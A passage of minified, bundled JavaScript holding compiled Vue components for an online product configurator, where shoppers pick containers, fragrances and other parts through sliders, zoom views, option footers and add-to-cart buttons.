this.$store.getters.resources},container:function(){return this.$store.getters.containerPart()},filler:function(){return this.$store.getters.fillerPart()},usps:function(){return this.isResultScreen?this.customizedUsp:this.resources.usps}},mounted:function(){this.setCustomisedProps()},data:function(){return{customizedHeading:"",customizedBody:"",customizedUsp:[]}}},t.exports.__esModule&&(t.exports=t.exports.default);var o,s="function"==typeof t.exports?t.exports.options:t.exports;s.functional,s.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"product-description"},[n("div",{staticClass:"product-info-column product-info-column-details"},[n("div",{staticClass:"product-info-content"},[e.isResultScreen?n("span",{staticClass:"result-label"},[e._v(e._s(e.resources.screens.result.heading))]):e._e(),e._v(" "),e.isResultScreen?n("h3",[e._v(e._s(e.customizedHeading))]):e._e(),e._v(" "),e.isResultScreen?e._e():n("h3",[e._v(e._s(e.resources.screens.intro.heading))]),e._v(" "),e.hideParagraph?e._e():n("p",[e._v(e._s(e.resources.screens.intro.body))]),e._v(" "),n("div",{staticClass:"product-info-icons"},e._l(e.usps,(function(t){return n("div",{staticClass:"item"},[n("span",{staticClass:"product-info-icon"},[n("span",{class:["icon",t.icon]})]),e._v(" "),n("span",{staticClass:"info-text"},[e._v("\n                        "+e._s(t.label)+"\n                    ")])])})),0),e._v(" "),n("div",{staticClass:"product-info-footer"},[n("div",{staticClass:"product-price"},[n("div",{staticClass:"prices-container"},[n("span",{staticClass:"price-sales"},[e._v("\n                            "+e._s(e.productData.price.formattedSale)+"\n                        ")])])]),e._v(" "),e.isResultScreen?e._e():n("button",{staticClass:"btn btn-customize btn--secondary",attrs:{type:"button"},on:{click:function(t){return e.nextScreen()}}},[n("span",[e._v(e._s(e.resources.screens.intro.button.label))]),e._v(" "),n("span",{class:e.resources.screens.intro.button.icon})]),e._v(" "),e.isResultScreen?n("button",{staticClass:"btn",attrs:{type:"submit"},on:{click:function(t){return e.addToCart()}}},[e._v("\n                    "+e._s(e.resources.global.buttonAddToCart)+"\n                ")]):e._e(),e._v(" "),e.isResultScreen?n("button",{staticClass:"btn btn--secondary",attrs:{type:"submit"},on:{click:function(t){return e.redirectToPDP()}}},[e._v("\n                    "+e._s(e.resources.global.buttonDetails)+"\n                ")]):e._e()])])])])},s.staticRenderFns=[],t.hot&&((o=e("vue-hot-reload-api")).install(e("vue"),!0),o.compatible&&(t.hot.accept(),t.hot.data?o.reload("data-v-35138a73",s):o.createRecord("data-v-35138a73",s)))},{"../../../pages/product/addToCart":566,"../analytics.js":381,axios:7,vue:279,"vue-hot-reload-api":275}],388:[function(e,t,n){var r;r=e("../../../dam/dam-helper"),t.exports={name:"product-image",props:{className:{type:String,default:""},image:Object},methods:{onImgLoad:function(){this.isLoaded=!0}},mounted:function(){r.updateImages(this.$refs.productImage)},data:function(){return{isLoaded:!1}}},t.exports.__esModule&&(t.exports=t.exports.default);var i,a="function"==typeof t.exports?t.exports.options:t.exports;a.functional,a.render=function(){var e=this.$createElement,t=this._self._c||e;return t("div",{ref:"productImage",staticClass:"product-image",class:[this.className,{loading:!this.isLoaded}]},[t("img",{class:this.image.class,attrs:{"data-src":this.image.src,alt:this.image.alt,"data-width":this.image.width},on:{load:this.onImgLoad}})])},a.staticRenderFns=[],t.hot&&((i=e("vue-hot-reload-api")).install(e("vue"),!0),i.compatible&&(t.hot.accept(),t.hot.data?i.reload("data-v-4166c331",a):i.createRecord("data-v-4166c331",a)))},{"../../../dam/dam-helper":430,vue:279,"vue-hot-reload-api":275}],389:[function(e,t,n){var r;r=e("../product-image/product-image.vue"),t.exports={name:"product-showcase",components:{ProductImage:r},props:{inView:Boolean,desktopMode:Boolean},methods:{showProductAtIndex:function(e){return!this.desktopMode||this.inView||(e+1)%3==0}},computed:{resources:function(){return this.$store.getters.resources},images:function(){var e=this.desktopMode?"desktop":"mobile";return this.resources.screens.intro.images[e]}}},t.exports.__esModule&&(t.exports=t.exports.default);var i,a="function"==typeof t.exports?t.exports.options:t.exports;a.functional,a.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"product-showcase"},[n("transition-group",{attrs:{name:"product-showcase-transition",tag:"figure"}},e._l(e.images,(function(t,r){return n("product-image",{directives:[{name:"show",rawName:"v-show",value:e.showProductAtIndex(r),expression:"showProductAtIndex(idx)"}],key:"image"+r,attrs:{image:t}})})),1)],1)},a.staticRenderFns=[],t.hot&&((i=e("vue-hot-reload-api")).install(e("vue"),!0),i.compatible&&(t.hot.accept(),t.hot.data?i.reload("data-v-33b02656",a):i.createRecord("data-v-33b02656",a)))},{"../product-image/product-image.vue":388,vue:279,"vue-hot-reload-api":275}],390:[function(e,t,n){var r,i,a,o;r=e("../product-image/product-image.vue"),i=e("../slider-controls/slider-controls.vue"),a=e("../../../../../node_modules/vue-slick-carousel"),o=e("../analytics.js"),t.exports={name:"product-slider",mixins:[o],components:{ProductImage:r,SliderControls:i,VueSlickCarousel:a},props:{desktopMode:Boolean},methods:{onClickArrowLeft:function(){this.$refs.carousel.prev()},onClickArrowRight:function(){this.$refs.carousel.next()},onResizeWindow:function(){this.updateCenterPadding()},onBeforeChange:function(e,t){this.currentSlide=t},nextScreen:function(){this.$store.commit("setUserConfiguration",["container",this.part.options[this.currentSlide].id]),this.$emit("selectPart",{name:this.part.options[this.currentSlide].name,image:this.part.options[this.currentSlide].image}),this.$emit("clickContinuSelection"),this.handleStepInteraction("choose this container")},updateCenterPadding:function(){var e=this.desktopMode?this.sliderSettings.slidesToShow:this.sliderSettings.responsive[0].settings.slidesToShow,t=(1440<window.innerWidth?1440:window.innerWidth)/((this.desktopMode?2:3)*(e+1));this.sliderSettings.centerPadding=t+"px"}},computed:{initialSlide:function(){var e,t=this.userConfiguration.container||this.part.selected,n=0,r=_createForOfIteratorHelper(this.part.options.entries());try{for(r.s();!(e=r.n()).done;){var i=_slicedToArray(e.value,2),a=i[0];i[1].id===t&&(n=a)}}catch(e){r.e(e)}finally{r.f()}return n},userConfiguration:function(){return this.$store.getters.userConfiguration},resources:function(){return this.$store.getters.resources},part:function(){return this.$store.getters.containerPart()},partAvailable:function(){return this.part.options[this.currentSlide].available},partName:function(){return this.part.options[this.currentSlide].name}},created:function(){this.currentSlide=this.initialSlide,this.sliderSettings.initialSlide=this.initialSlide,window.addEventListener("resize",this.onResizeWindow)},destroyed:function(){window.removeEventListener("resize",this.onResizeWindow)},mounted:function(){this.updateCenterPadding()},data:function(){return{currentSlide:0,showLeftArrow:!0,showRightArrow:!0,sliderSettings:{arrows:!1,centerMode:!0,centerPadding:"0",dots:!1,focusOnSelect:!0,infinite:!0,initialSlide:0,touchThreshold:500,responsive:[{breakpoint:1024,settings:{centerPadding:"25%",slidesToShow:1,speed:150,swipe:!0}},{breakpoint:767,settings:{centerPadding:"15%",slidesToShow:1,speed:150,swipe:!0}}],slidesToShow:3,swipe:!1,waitForAnimate:!1}}}},t.exports.__esModule&&(t.exports=t.exports.default);var s,l="function"==typeof t.exports?t.exports.options:t.exports;l.functional,l.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"configurator-slider"},[n("span",{class:["icon",e.part.icon]}),e._v(" "),n("h3",[e._v(e._s(e.resources.screens.containerPicker.heading))]),e._v(" "),n("div",{staticClass:"configurator-slider-body"},[n("VueSlickCarousel",e._b({ref:"carousel",on:{beforeChange:e.onBeforeChange}},"VueSlickCarousel",e.sliderSettings,!1),e._l(e.part.options,(function(t,r){return n("product-image",{attrs:{className:r===e.currentSlide?"selected":"",image:t.thumb}})})),1)],1),e._v(" "),n("slider-controls",{attrs:{showLeftArrow:e.showLeftArrow,showRightArrow:e.showRightArrow},on:{clickArrowLeft:function(t){return e.onClickArrowLeft()},clickArrowRight:function(t){return e.onClickArrowRight()}}}),e._v(" "),n("div",{staticClass:"configurator-slider-footer"},[n("div",{staticClass:"part-details"},[n("transition",{attrs:{name:"error-message-transition"}},[n("span",{directives:[{name:"show",rawName:"v-show",value:!e.partAvailable,expression:"!partAvailable"}],staticClass:"error-message"},[n("span",{staticClass:"error-badge"}),e._v("\n                    "+e._s(e.resources.global.notInStockShort)+"\n                ")])]),e._v(" "),n("span",{class:["part-name",{"not-available":!e.partAvailable}]},[e._v("\n                "+e._s(e.partName)+"\n            ")])],1),e._v(" "),n("button",{staticClass:"btn btn-customize",attrs:{type:"button",disabled:!e.partAvailable},on:{click:function(t){return e.nextScreen()}}},[e._v("\n            "+e._s(e.resources.screens.containerPicker.chooseButtonLabel)+"\n        ")])])],1)},l.staticRenderFns=[],t.hot&&((s=e("vue-hot-reload-api")).install(e("vue"),!0),s.compatible&&(t.hot.accept(),t.hot.data?s.reload("data-v-50dbd655",l):s.createRecord("data-v-50dbd655",l)))},{"../../../../../node_modules/vue-slick-carousel":277,"../analytics.js":381,"../product-image/product-image.vue":388,"../slider-controls/slider-controls.vue":393,vue:279,"vue-hot-reload-api":275}],391:[function(e,t,n){var r,i,a;r=e("../product-image/product-image.vue"),i=e("../slider-controls/slider-controls.vue"),a=e("../../../../../node_modules/vue-slick-carousel"),t.exports={name:"result-slider",components:{ProductImage:r,SliderControls:i,VueSlickCarousel:a},props:{mobileMode:Boolean},methods:{onClickArrowLeft:function(){this.$refs.resultCarousel.prev()},onClickArrowRight:function(){this.$refs.resultCarousel.next()},onBeforeChange:function(e,t){this.currentSlide=t},previousScreen:function(){this.$emit("clickReturnResultSlider")},setIndicatorLeft:function(){this.indicatorLeft=this.indicatorWidth*this.currentSlide},setIndicatorWidth:function(){var e=this.$refs.resultCarousel.$root.$el.querySelector(".slick-dots .slick-active"),t=e?e.getBoundingClientRect():"";this.indicatorWidth=e?t.width:0}},watch:{currentSlide:function(){this.setIndicatorLeft()}},computed:{userConfiguration:function(){return this.$store.getters.userConfiguration},part:function(){return this.$store.getters.containerPart()},productOption:function(){for(var e=0,t=Object.values(this.part.options);e<t.length;e++){var n=t[e];if(n.id===this.userConfiguration.container)return n}},images:function(){for(var e=this.productOption,t=[e.howToUseImage,e.productLifestyleImage],n=0,r=Object.values(e.primaryAndSecondaryImages);n<r.length;n++){var i=r[n];t.push(i)}return t}},mounted:function(){this.setIndicatorLeft(),this.setIndicatorWidth(),this.showLeftArrow=this.showRightArrow=1<this.images.length},data:function(){return{currentSlide:0,indicatorLeft:0,indicatorWidth:0,showLeftArrow:!0,showRightArrow:!0,sliderSettings:{arrows:!1,centerPadding:"0",dots:!0,infinite:!0,touchThreshold:500,responsive:[{breakpoint:1024,settings:{centerMode:!0,centerPadding:"20%",focusOnSelect:!0,slidesToShow:1,speed:150,swipe:!0}},{breakpoint:767,settings:{centerMode:!0,centerPadding:"14%",focusOnSelect:!0,slidesToShow:1,speed:150,swipe:!0}}],slidesToShow:1,swipe:!1,waitForAnimate:!1}}}},t.exports.__esModule&&(t.exports=t.exports.default);var o,s="function"==typeof t.exports?t.exports.options:t.exports;s.functional,s.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"result-slider"},[n("div",{staticClass:"configured-product"},[n("VueSlickCarousel",e._b({ref:"resultCarousel",on:{beforeChange:e.onBeforeChange}},"VueSlickCarousel",e.sliderSettings,!1),e._l(e.images,(function(t,r){return n("product-image",{attrs:{className:r===e.currentSlide?"selected":"",image:t}})})),1)],1),e._v(" "),n("button",{staticClass:"icon-restart restart-button",attrs:{type:"button"},on:{click:function(t){return e.previousScreen()}}},[n("span",{staticClass:"sr-only"},[e._v("Move back")])]),e._v(" "),n("div",{staticClass:"configurator-slider-indicator"},[n("span",{staticClass:"configurator-current-slide",style:"left: "+e.indicatorLeft+"px; width: "+e.indicatorWidth+"px"})]),e._v(" "),n("slider-controls",{attrs:{showLeftArrow:e.showLeftArrow,showRightArrow:e.showRightArrow,showArrowBackground:!0},on:{clickArrowLeft:function(t){return e.onClickArrowLeft()},clickArrowRight:function(t){return e.onClickArrowRight()}}})],1)},s.staticRenderFns=[],t.hot&&((o=e("vue-hot-reload-api")).install(e("vue"),!0),o.compatible&&(t.hot.accept(),t.hot.data?o.reload("data-v-49dc714e",s):o.createRecord("data-v-49dc714e",s)))},{"../../../../../node_modules/vue-slick-carousel":277,"../product-image/product-image.vue":388,"../slider-controls/slider-controls.vue":393,vue:279,"vue-hot-reload-api":275}],392:[function(e,t,n){var r;r=e("../product-image/product-image.vue"),t.exports={name:"selected-product",components:{ProductImage:r},props:{desktopMode:Boolean,fragranceName:String,partName:String,productImage:Object},methods:{previousScreen:function(){this.$emit("clickReturnSelectedProduct")}},computed:{userConfiguration:function(){return this.$store.getters.userConfiguration},resources:function(){return this.$store.getters.resources},assembledPartName:function(){return this.partName+" - "+this.fragranceName}}},t.exports.__esModule&&(t.exports=t.exports.default);var i,a="function"==typeof t.exports?t.exports.options:t.exports;a.functional,a.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"selected-product"},[n("product-image",{attrs:{image:e.productImage}}),e._v(" "),n("span",{staticClass:"part-name"},[e._v("\n        "+e._s(e.assembledPartName)+"\n    ")]),e._v(" "),e.desktopMode?n("button",{staticClass:"btn btn-customize btn--secondary",attrs:{type:"button"},on:{click:function(t){return e.previousScreen()}}},[e._v("\n        "+e._s(e.resources.screens.fragrance.buttonChangeProduct)+"\n    ")]):e._e()],1)},a.staticRenderFns=[],t.hot&&((i=e("vue-hot-reload-api")).install(e("vue"),!0),i.compatible&&(t.hot.accept(),t.hot.data?i.reload("data-v-473b0f15",a):i.createRecord("data-v-473b0f15",a)))},{"../product-image/product-image.vue":388,vue:279,"vue-hot-reload-api":275}],393:[function(e,t,n){t.exports={name:"slider-controls",props:{showLeftArrow:{type:Boolean,default:!0},showRightArrow:{type:Boolean,default:!0},showArrowBackground:{type:Boolean,default:!1}},methods:{onClickArrowLeft:function(){this.$emit("clickArrowLeft")},onClickArrowRight:function(){this.$emit("clickArrowRight")}}},t.exports.__esModule&&(t.exports=t.exports.default);var r,i="function"==typeof t.exports?t.exports.options:t.exports;i.functional,i.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{staticClass:"configurator-slider-controls"},[n("button",{class:["icon-arrow3--left","slider-button",{hidden:!e.showLeftArrow},{"has-background":e.showArrowBackground}],attrs:{type:"button"},on:{click:function(t){return e.onClickArrowLeft()}}},[n("span",{staticClass:"sr-only"},[e._v("Move to left")])]),e._v(" "),n("button",{class:["icon-arrow3--right","slider-button",{hidden:!e.showRightArrow},{"has-background":e.showArrowBackground}],attrs:{type:"button"},on:{click:function(t){return e.onClickArrowRight()}}},[n("span",{staticClass:"sr-only"},[e._v("Move to right")])])])},i.staticRenderFns=[],t.hot&&((r=e("vue-hot-reload-api")).install(e("vue"),!0),r.compatible&&(t.hot.accept(),t.hot.data?r.reload("data-v-9cf2800a",i):r.createRecord("data-v-9cf2800a",i)))},{vue:279,"vue-hot-reload-api":275}],394:[function(e,t,n){var r;r=e("../assembled-product/assembled-product.vue"),t.exports={name:"assembled-product-zoom",components:{AssembledProduct:r},props:{isDesktop:Boolean,productZoomStyle:[Object,Number]},methods:{getTouchMoveY:function(e){var t=void 0===e?0:this.yStartTouch-e.touches[0].pageY,n=this.yProductImage-t;return Math.min(Math.max(n,-window.innerHeight),0)},updateImagePosition:function(e){var t=this.getTouchMoveY(e);this.zoomStyleProps.top=t+"px"},updateProductCssClass:function(e,t){t?this.assembledProductCssClass.push(e):this.assembledProductCssClass=this.assembledProductCssClass.filter((function(t){return t!==e}))},onClickClose:function(){var e=this,t=this.showZoomPart&&!this.isDesktop?200:0;this.isClosing=!0,this.setZoomStyleProps(this.shouldStartWithZoom?"zoom-top":"zoom-start"),setTimeout((function(){e.isActive=!1,e.showZoomPart=!1,e.initialMobileZoomStyle=e.productZoomStyle}),t),setTimeout((function(){e.showZoom=!1,e.isClosing=!1}),600+t)},onMouseEnter:function(e){this.showZoomPart&&!this.isClosing&&this.setZoomStyleProps(e.target.id)},onTouchStart:function(e){var t=document.querySelector(".is-product-zoom").getBoundingClientRect().top;this.isClickEvent=!0,this.yProductImage=t||0,this.yStartTouch=e.touches[0].pageY,this.updateProductCssClass("move-active",!0)},onTouchMove:function(e){this.showZoomPart&&!this.isClosing&&this.updateImagePosition(e),this.isClickEvent=!1},onTouchEndOrClick:function(e){var t=this;this.updateProductCssClass("move-active",!1),this.isClickEvent&&(this.shouldStartWithZoom&&!this.isActive?(this.isActive=!0,this.showZoom=!0,this.showZoomPart=!0,this.setZoomStyleProps("zoom-top"),setTimeout((function(){t.initialMobileZoomStyle={}}),100)):this.showZoomPart?(this.showZoomPart=!1,this.setZoomStyleProps("zoom-start")):this.showZoom?(this.showZoomPart=!0,this.setZoomStyleProps(e.target.id)):(this.isActive=!0,this.showZoom=!0,this.setZoomStyleProps("zoom-start"),setTimeout((function(){t.initialMobileZoomStyle={}}),100)))},setZoomStyleProps:function(e){var t="scale3d("+this.zoomScaleFactor+", "+this.zoomScaleFactor+", 1)",n={"zoom-top":{top:"0px",transform:t},"zoom-middle":{top:-window.innerHeight/this.zoomScaleFactor+"px",transform:t},"zoom-bottom":{top:-window.innerHeight+"px",transform:t},"zoom-start":{top:"0px"}};this.zoomStyleProps=n[e]}},watch:{footerMode:function(e){var t="optionsFooter"===e&&(4===this.optionTileType||5===this.optionTileType);this.updateProductCssClass("start-with-zoom",t)},productZoomStyle:function(e){this.initialMobileZoomStyle=e}},computed:{footerMode:function(){return this.$store.getters.footerMode},optionTileType:function(){return this.$store.getters.currentProductPart.optionTileType},shouldStartWithZoom:function(){return(4===this.optionTileType||5===this.optionTileType)&&"optionsFooter"===this.footerMode}},data:function(){return{assembledProductCssClass:["is-product-zoom"],initialMobileZoomStyle:{},isActive:!1,isClickEvent:!0,isClosing:!1,showZoom:!1,showZoomPart:!1,touchedMobileZoomStyle:{},yProductImage:0,yStartTouch:0,zoomScaleFactor:2,zoomStyleProps:{}}}},t.exports.__esModule&&(t.exports=t.exports.default);var i,a="function"==typeof t.exports?t.exports.options:t.exports;a.functional,a.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{class:["assembled-product-zoom",{active:e.isActive}],style:e.initialMobileZoomStyle},[n("div",{staticClass:"zoom-trigger",attrs:{id:"zoom-top"},on:{mouseenter:e.onMouseEnter,click:e.onTouchEndOrClick,touchstart:e.onTouchStart,touchmove:function(t){return t.preventDefault(),e.onTouchMove(t)},touchend:function(t){return t.preventDefault(),e.onTouchEndOrClick(t)}}}),e._v(" "),n("div",{staticClass:"zoom-trigger",attrs:{id:"zoom-middle"},on:{mouseenter:e.onMouseEnter,click:e.onTouchEndOrClick,touchstart:e.onTouchStart,touchmove:function(t){return t.preventDefault(),e.onTouchMove(t)},touchend:function(t){return t.preventDefault(),e.onTouchEndOrClick(t)}}}),e._v(" "),n("div",{staticClass:"zoom-trigger",attrs:{id:"zoom-bottom"},on:{mouseenter:e.onMouseEnter,click:e.onTouchEndOrClick,touchstart:e.onTouchStart,touchmove:function(t){return t.preventDefault(),e.onTouchMove(t)},touchend:function(t){return t.preventDefault(),e.onTouchEndOrClick(t)}}}),e._v(" "),n("button",{staticClass:"zoom-close",on:{click:e.onClickClose}},[n("span",{staticClass:"icon icon-close-thick"})]),e._v(" "),n("assembled-product",{attrs:{cssClass:e.assembledProductCssClass,inlineStyle:e.zoomStyleProps,isVisible:e.showZoom,isDesktop:e.isDesktop,isProductZoom:!0}}),e._v(" "),n("div",{directives:[{name:"show",rawName:"v-show",value:e.showZoom,expression:"showZoom"}],staticClass:"zoom-backdrop"})],1)},a.staticRenderFns=[],t.hot&&((i=e("vue-hot-reload-api")).install(e("vue"),!0),i.compatible&&(t.hot.accept(),t.hot.data?i.reload("data-v-72a347be",a):i.createRecord("data-v-72a347be",a)))},{"../assembled-product/assembled-product.vue":395,vue:279,"vue-hot-reload-api":275}],395:[function(e,t,n){var r;r=e("../image-layer/image-layer.vue"),t.exports={name:"assembled-product",components:{ImageLayer:r},props:{isTablet:{type:Boolean,default:!1},isDesktop:{type:Boolean,default:!1},isVisible:{type:Boolean,default:!1},isOverlayVisible:{type:Boolean,default:!1},isProductZoom:{type:Boolean,default:!1},cssClass:{type:Array,default:function(){return[]}},inlineStyle:{type:Object,default:function(){return{}}},isUpsellScreen:{type:Boolean,default:!1}},methods:{getHeightInPercentage:function(){var e=document.querySelector("#"+this.footerMode),t=e?e.getBoundingClientRect().height:175,n=this.getFooterHeaderHeight();return 100-100/window.innerHeight*(t+n)},getFooterHeaderHeight:function(){return!this.isTablet||"optionsFooter"!=this.footerMode&&"upsellFooter"!=this.footerMode?0:150},setProductHeight:function(){var e=this.getHeightInPercentage(),t=this.getFooterHeaderHeight();this.assembledProductStyle={"margin-top":t+"px",height:e+"%"},this.$emit("productStyleSet",this.assembledProductStyle)},setProductPartZoom:function(e){"top"===e?this.assembledProductClass.push("zoom-top"):"middle"===e?this.assembledProductClass.push("zoom-middle"):this.assembledProductClass=this.assembledProductClass.filter((function(e){return"zoom-top"!==e&&"zoom-middle"!==e}))},onClickBack:function(){var e=this;setTimeout((function(){e.$emit("clickBackButton")}),this.isDesktop?0:15)}},watch:{isVisible:function(e){var t=this;!0!==e||this.isDesktop||this.isProductZoom||setTimeout((function(){t.setProductHeight()}),1200)},footerMode:function(e,t){var n=this;1!=this.optionTileType&&2!=this.optionTileType||this.isDesktop||this.isProductZoom||setTimeout((function(){n.setProductHeight()}),300),"upsellFooter"==e&&this.isTablet&&!this.isProductZoom&&setTimeout((function(){n.setProductHeight()}),300),"upsellFooter"!=t||this.isDesktop||this.isProductZoom||setTimeout((function(){n.setProductHeight()}),300),"optionsFooter"!=e||this.isProductZoom?this.setProductPartZoom(!1):this.setProductPartZoom(this.$store.getters.currentProductPart.zoomImageOnEnter)},cssClass:function(e){this.assembledProductClass=e}},computed:{fragranceLabel:function(){var e=_slicedToArray(this.productLayers[0].split("-"),3),t=e[0],n=e[1],r=e[2];return this.$store.getters.productParts[t].categories[n].options[r].name},assembledImage:function(){var e=this.$store.getters.productParts,t=this.productLayers,n={};if(t.forEach((function(t){var r=_slicedToArray(t.split("-"),3),i=r[0],a=r[1],o=r[2],s=e[i].categories;n[e[i].resourceId]=s[a].options[o]})),this.$store.getters.resources.updateData.isTalisman){var r=this.isUpsellScreen?this.$store.getters.resources.updateData.talismanImagePlaceholders.secondaryImageThird:this.$store.getters.resources.updateData.talismanPrimaryImagePlaceholder;return r.src=String.format(r.urlFormat,n.bottle.EAN,n.fragrance.EAN,n.talisman.EAN,n.cap.EAN),r}return(n.bottle||n.candleholder).image},footerMode:function(){return this.$store.getters.footerMode},productLayers:function(){return this.$store.getters.productLayers},optionTileType:function(){return this.$store.getters.currentProductPart.optionTileType},shouldShowBackButton:function(){return this.isUpsellScreen}},mounted:function(){var e=this;0<this.cssClass.length&&(this.assembledProductClass=this.cssClass),"upsellFooter"==this.footerMode&&this.isTablet&&!this.isProductZoom&&setTimeout((function(){e.setProductHeight()}),100)},data:function(){return{assembledProductStyle:{},assembledProductClass:[]}}},t.exports.__esModule&&(t.exports=t.exports.default);var i,a="function"==typeof t.exports?t.exports.options:t.exports;a.functional,a.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{directives:[{name:"show",rawName:"v-show",value:e.isVisible,expression:"isVisible"}],class:["assembled-product",{blurred:e.isOverlayVisible}].concat(e.assembledProductClass),style:Object.assign({},e.assembledProductStyle,e.inlineStyle)},[e.shouldShowBackButton?n("button",{class:["icon-arrow3--left","restart-button","fixed"],attrs:{type:"button"},on:{click:function(t){return e.onClickBack()}}},[n("span",{staticClass:"sr-only"},[e._v("Move back")])]):e._e(),e._v(" "),n("image-layer",{attrs:{wrapperClass:"layer",image:e.assembledImage,shouldUpdateImage:!0}}),e._v(" "),n("span",{staticClass:"fragrance-label"},[e._v("\n        "+e._s(e.fragranceLabel)+"\n    ")])],1)},a.staticRenderFns=[],t.hot&&((i=e("vue-hot-reload-api")).install(e("vue"),!0),i.compatible&&(t.hot.accept(),t.hot.data?i.reload("data-v-314ebecb",a):i.createRecord("data-v-314ebecb",a)))},{"../image-layer/image-layer.vue":396,vue:279,"vue-hot-reload-api":275}],396:[function(e,t,n){var r;r=e("../../../dam/dam-helper"),t.exports={name:"image-layer",mounted:function(){r.updateImages(this.$refs.imageLayer)},updated:function(){this.shouldUpdateImage&&r.updateImages(this.$refs.imageLayer)},props:{image:Object,wrapperClass:String,shouldUpdateImage:{type:Boolean,default:!1}}},t.exports.__esModule&&(t.exports=t.exports.default);var i,a="function"==typeof t.exports?t.exports.options:t.exports;a.functional,a.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return e.image&&e.wrapperClass?n("div",{ref:"imageLayer",class:e.wrapperClass},[n("img",{class:e.image.class,attrs:{src:e.image.placeholder,"data-src":e.image.src,alt:"","data-width":e.image.width}})]):e._e()},a.staticRenderFns=[],t.hot&&((i=e("vue-hot-reload-api")).install(e("vue"),!0),i.compatible&&(t.hot.accept(),t.hot.data?i.reload("data-v-070cfe3e",a):i.createRecord("data-v-070cfe3e",a)))},{"../../../dam/dam-helper":430,vue:279,"vue-hot-reload-api":275}],397:[function(e,t,n){var r,i,a,o;r=e("../overlay/overlay.vue"),i=e("../status-bar/status-bar.vue"),a=e("../part-options/part-options.vue"),o=e("../image-layer/image-layer.vue"),t.exports={name:"options-footer",components:{Overlay:r,StatusBar:i,PartOptions:a,ImageLayer:o},props:{isMobile:Boolean,isTablet:Boolean,isDesktop:Boolean},methods:{accept:function(){var e=this;this.reset(),setTimeout((function(){e.$store.commit("popSnapshot"),e.$store.commit("setFooterMode","partsFooter"),e.$emit("optionFooterChange",e.shouldShowOverlay)}),this.isTablet?100:0)},cancel:function(){var e=this;this.reset(),setTimeout((function(){e.$store.commit("useSnapshot"),e.$store.commit("setFooterMode","partsFooter")}),this.isTablet?100:0)},reset:function(){this.isTablet&&(this.shouldShowHeader=!1)},toggleOverlay:function(){this.shouldShowOverlay=!this.shouldShowOverlay,this.$emit("overlayChange",this.shouldShowOverlay)},onClickPartOption:function(e){var t=_slicedToArray(this.$store.getters.productLayers[this.currentProductPart.depth].split("-"),3)[2];this.selectedPartUnavailable=!this.currentProductPart.categories[e.cid].options[e.id].available,this.productPartChanged=e.id==t},onClickPartOptionReadMore:function(e){if(this.overlayResource={heading:e.name,body:e.description.split("||"),notes:[],thumb:e.thumb},e.notes)for(var t=0;t<e.notes.length;t++)this.overlayResource.notes.push(e.notes[t]);this.toggleOverlay()},onClickOverlayClose:function(){this.toggleOverlay()}},computed:{icon:function(){return this.currentProductPart.icon},resource:function(){var e=this.currentProductPart.resourceId;return this.$store.getters.resources.productParts[e]},hasCategories:function(){return 1===this.currentProductPart.optionTileType},currentProductPart:function(){return this.$store.getters.currentProductPart},currentPartUnavailable:function(){var e=_slicedToArray(this.$store.getters.productLayers[this.currentProductPart.depth].split("-"),3),t=e[0],n=e[1],r=e[2];return!this.$store.getters.productParts[t].categories[n].options[r].available},statusMessage:function(){var e=_slicedToArray(this.$store.getters.productLayers[this.currentProductPart.depth].split("-"),3),t=e[0],n=e[1],r=e[2],i=this.$store.getters.productParts[t].categories[n].options[r],a=i.outOfStockName||i.name;return this.$store.getters.resourceGlobal.unavailableCustom+" "+a},optionTileType:function(){return this.$store.getters.currentProductPart.optionTileType},isZoomImage:function(){return!1!==this.currentProductPart.zoomImageOnEnter}},beforeDestroy:function(){this.shouldShowHeader=!1},mounted:function(){this.selectedPartUnavailable=this.currentPartUnavailable,this.shouldShowHeader=!this.isMobile},data:function(){return{selectedPartUnavailable:!1,shouldShowOverlay:!1,shouldShowHeader:!1,overlayResource:{},productPartChanged:!1}}},t.exports.__esModule&&(t.exports=t.exports.default);var s,l="function"==typeof t.exports?t.exports.options:t.exports;l.functional,l.render=function(){var e=this,t=e.$createElement,n=e._self._c||t;return n("div",{ref:"optionsFooter",staticClass:"options-footer",class:["options-footer",{"has-overlay":e.shouldShowOverlay},{"is-zoom-image":e.isZoomImage},{"full-height-footer":3===e.optionTileType}],attrs:{id:"optionsFooter"}},[n("transition",{attrs:{name:"footer-header-transition"}},[n("div",{directives:[{name:"show",rawName:"v-show",value:e.shouldShowHeader,expression:"shouldShowHeader"}],staticClass:"footer-header",class:{"has-categories":e.hasCategories}},[n("span",{class:"icon "+e.icon}),e._v(" "),n("h3",[e._v(e._s(e.resource.heading))]),e._v(" "),e.isTablet&&3!==e.optionTileType?e._e():n("p",[e._v(e._s(e.resource.body))])])]),e._v(" "),n("overlay",{attrs:{isDesktop:e.isDesktop,shouldShow:e.shouldShowOverlay},on:{onClickClose:e.onClickOverlayClose}},[n("image-layer",{attrs:{wrapperClass:"fragrance-image",image:e.overlayResource.thumb,shouldUpdateImage:!0}}),e._v(" "),e.shouldShowOverlay?n("h1",[e._v(e._s(e.overlayResource.heading))]):e._e(),e._v(" "),e._l(e.overlayResource.body,(function(t){return n("p",[e._v(e._s(t))])})),e._v(" "),e._l(e.overlayResource.notes,(function(t){return n("div",{staticClass:"fragrance-note"},[n("span",{staticClass:"fragrance-title"},[e._v(e._s(t.Name))]),e._v(" "),n("span",{staticClass:"fragrance-text"},[e._v(e._s(t.Description))])])}))],2),e._v(" "),n("part-options",{attrs:{isTablet:e.isTablet,isDesktop:e.isDesktop},on:{onClickPart:e.onClickPartOption,onClickReadMore:e.onClickPartOptionReadMore}}),e._v(" "),n("transition",{attrs:{name:"status-bar-transition"}},[n("status-bar",{directives:[{name:"show",rawName:"v-show",value:e.selectedPartUnavailable,expression:"selectedPartUnavailable"}],attrs:{message:e.statusMessage}})],1),e._v(" "),n("div",{staticClass:"button-row"},[n("button",{staticClass:"btn btn--secondary",on:{click:function(t){return e.cancel()}}},[n("span",{staticClass:"icon icon-close-thick"})]),e._v(" 